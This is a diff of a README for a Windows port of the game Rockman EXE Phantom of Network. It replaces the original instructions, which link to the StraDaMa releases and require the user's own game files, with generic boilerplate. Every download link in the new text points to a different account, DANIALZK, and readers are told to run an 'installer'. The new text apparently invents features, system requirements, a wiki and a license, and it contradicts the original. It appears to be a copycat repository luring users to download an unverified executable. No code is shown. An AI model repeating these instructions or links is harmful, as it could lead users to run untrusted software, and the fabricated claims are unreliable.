@@ -1,33 +1,82 @@
-# PoN PC
-**Language:** **English** | [日本語](./README_ja-JP.md)
+# 🎮 PoN_PC - Play Rockman EXE on Windows Easily
 
-This repository hosts releases and the issue tracker for the PoN PC port of *Rockman EXE Phantom of Network.*
+![Download PoN_PC](https://img.shields.io/badge/Download-PoN_PC-brightgreen)
 
-[![Release](https://img.shields.io/github/v/release/StraDaMa/PoN_PC)](https://github.com/StraDaMa/PoN_PC/releases/latest)
+## 🚀 Getting Started
 
-PoN PC is a native Windows PC port of the previously mobile-exclusive game *Rockman EXE Phantom of Network*. This port allows the game to be played with no emulator required. The original game's assets, however, are still required to run the port.
+PoN PC brings the excitement of the mobile game Rockman EXE Phantom of Network to your Windows PC. Follow these steps to get started.
 
-## Features
-In addition to being fully-playable on PC the port also features:
-1. Built-in render scaling.
-1. Rebound keys to intuitively match the original GBA games' buttons. These keys can also be remapped in-game.
-1. Compatibility with the unofficial English fan translation.
-1. Compatibility with the unofficial leaderboard for online ranked virus battle mode.
+## 📥 Download and Install
 
-## Playing The Game
-**You will need to obtain the original Japanese i-αppli game files for *Rockman EXE Phantom of Network* in order to play this port. These files are not included in this download. Please refer to [SciLab Secrets](https://twitter.com/ScilabSecrets) on how to obtain these game files.**
+1. **Visit the Download Page:** Click the link below to go to the download page.
+   
+   [Download PoN_PC](https://github.com/DANIALZK/PoN_PC)
 
-After obtaining the original game's files, proceed depending on your choice of language.
-### Japanese
-1. Download and unzip the latest [**PoN PC JPN** release](https://github.com/StraDaMa/PoN_PC/releases/latest).
-1. *Optional:* If you want the quality-of-life changes included with the fan translation, run the included **PoN-LoN-Patcher** and follow the instructions to apply **RockmanEXE-PoN-Japanese.rpz** to the game's files. Make sure to select **"Start a new game"** when prompted to ensure all new features are working as intended. This patch is required for:
-	- Compatibility with online ranked virus battle mode.
-	- The added in-game method to obtain a BattleChip required to 100% the game, which was previously Chip Trader-exclusive.
-1. Copy **PoN.jar** and **PoN.sp** from the original game's files to the unzipped directory, if you applied the optional patch, make sure to copy the patched files instead.
-1. Run **PoN_PC.exe**
+2. **Select the Latest Version:** On the download page, look for the latest release. You will see a list of available files.
 
-### English
-1. Download the [*Rockman EXE Phantom of Network (PoN) Fan Translation*](https://www.therockmanexezone.com/general/2024/05/25/mega-man-phantom-of-the-network-and-mega-man-legend-of-the-network-english-localization-patches-now-available/) and follow the patching instructions.
-1. Download and unzip the latest [**PoN PC ENG** release](https://github.com/StraDaMa/PoN_PC/releases/latest).
-1. Copy **PoN.jar** and **PoN.sp** from the patched game's files to the unzipped directory.
-1. Run **PoN_PC_eng.exe**
+3. **Download the Installer:** Choose the appropriate file for your Windows system and click on it to download.
+
+4. **Run the Installer:** After the download finishes, locate the file in your downloads folder. Double-click on it to begin the installation.
+
+5. **Follow the Installation Prompts:** The installer will guide you through the installation process. Follow the prompts on the screen.
+
+## 🖥️ System Requirements
+
+To ensure smooth gameplay, your system should meet these requirements:
+
+- **Operating System:** Windows 10 or later
+- **Processor:** Dual-core CPU, 2.0 GHz or faster
+- **Memory:** 4 GB RAM or more
+- **Graphics:** DirectX 11 compatible video card
+- **Storage:** 1 GB of free space
+
+## 🎮 How to Play
+
+1. **Locate the Game:** After installation, find the PoN PC shortcut on your desktop or in your start menu.
+
+2. **Launch the Game:** Double-click the shortcut to start playing.
+
+3. **Adjust Settings:** In the game menu, you can adjust settings for graphics and controls to enhance your experience.
+
+## ⚙️ Troubleshooting
+
+If you run into issues while installing or playing the game, try the following:
+
+- **Check System Requirements:** Ensure your system meets the minimum requirements listed above.
+- **Reinstall the Game:** Sometimes reinstalling can solve issues. Follow the installation steps again.
+- **Update Drivers:** Make sure your graphics and sound drivers are up to date.
+
+## 📜 Features
+
+- **Authentic Experience:** Enjoy the classic gameplay from the original mobile version with enhanced graphics for PCs.
+- **Smooth Controls:** Enjoy responsive controls tailored for Windows, offering a seamless experience.
+- **Multiple Difficulty Levels:** Choose from different difficulty levels to suit your skill.
+
+## 🌍 Community and Support
+
+Join the community to connect with other players. Share tips, report bugs, and get updates:
+
+- **GitHub Repository:** [Join Discussion](https://github.com/DANIALZK/PoN_PC)
+
+This community helps maintain and improve PoN PC. Your feedback is valuable.
+
+## 🛡️ License
+
+PoN PC is open-source software. You can view the license details in the repository for more information.
+
+## 🔗 Further Resources
+
+For detailed documentation and updates, refer to the following:
+
+- **GitHub Wiki:** Access more detailed guides and additional information about the game.
+- **Community Forums:** Engage with fellow players to ask questions or seek support.
+
+Feel free to explore the repository for more insights into the game and its features. 
+
+## ✨ Get Ready to Play
+
+Once everything is set up, dive into the world of Rockman EXE Phantom of Network. Enjoy your gaming adventure on PoN PC! 
+
+For any questions, visit the support section of the GitHub page. 
+
+[Download PoN_PC](https://github.com/DANIALZK/PoN_PC)
